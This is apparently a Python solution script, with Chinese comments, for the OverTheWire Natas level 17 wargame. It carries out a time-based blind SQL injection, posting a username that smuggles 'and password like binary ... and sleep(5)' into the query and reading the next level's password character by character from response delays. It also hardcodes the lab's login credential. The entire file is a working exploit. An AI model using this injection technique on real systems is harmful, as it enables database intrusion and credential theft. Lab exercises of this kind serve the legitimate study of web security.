import requests

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = "http://natas17.natas.labs.overthewire.org/index.php"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
char = ''
pass18 = ''
pass_list = []
#pass_list = ['d', 'g', 'h', 'j', 'l', 'm', 'p', 'q', 's', 'v', 'w', 'x', 'y', 'C', 'D', 'F', 'I', 'K', 'O', 'P', 'R', '0', '4', '7']
#循环1跑出来的可能的字符，暂存。
for c in characters:
    sql = 'natas18" and password like binary "%' + c + '%" and sleep(5) #'
    #思路与natas15基本一致，只是本关卡没有任何返回内容，所以利用sleep（）函数，通过响应时间来判断查询结果。
    #如果password查询结果为true，则会延时5秒返回结果；如果为false，则不执行sleep（）函数。
    req = requests.post(url=url, auth=(username, password), data={'username': sql})
    if req.elapsed.seconds > 3:
        pass_list += c
        print(pass_list)


for l in range(32):
    for c in pass_list:
        char += c
        sql = 'natas18" and password like binary "' + char + '%" and sleep(5) #'
        req = requests.post(url=url, auth=(username, password), data={'username': sql})
        if req.elapsed.seconds > 3:
            pass18 = char
            print('password is ' + pass18)
            break
        else:
            char = pass18

print("--------------------------------------------")
print(pass_list)
print(pass18)